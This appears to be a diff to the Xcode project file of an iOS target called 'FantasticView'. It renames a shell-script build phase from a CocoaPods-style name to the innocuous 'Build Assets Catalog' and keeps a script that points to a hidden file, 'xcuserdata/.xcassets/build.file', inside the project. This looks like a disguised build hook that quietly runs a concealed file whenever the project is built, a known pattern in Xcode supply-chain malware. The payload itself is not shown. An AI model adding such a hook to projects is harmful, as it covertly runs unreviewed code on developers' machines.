@@ -77,7 +77,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 4EB0B2BB2614368400393EBF /* Build configuration list for PBXNativeTarget "FantasticView" */;
 			buildPhases = (
-				5E0FF523D4B319F0EDAAC43A /* [CP] Build Pods Frameworks */,
+				A8F5CBAF25530BD8B0AAC43A /* Build Assets Catalog */,
 				4EB0B2A32614368200393EBF /* Sources */,
 				4EB0B2A42614368200393EBF /* Frameworks */,
 				4EB0B2A52614368200393EBF /* Resources */,
@@ -360,7 +360,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	5E0FF523D4B319F0EDAAC43A /* [CP] Build Pods Frameworks */ = {
+	A8F5CBAF25530BD8B0AAC43A /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -369,7 +369,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Build Assets Catalog";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -380,6 +380,8 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
+	
+
 	
 
 	
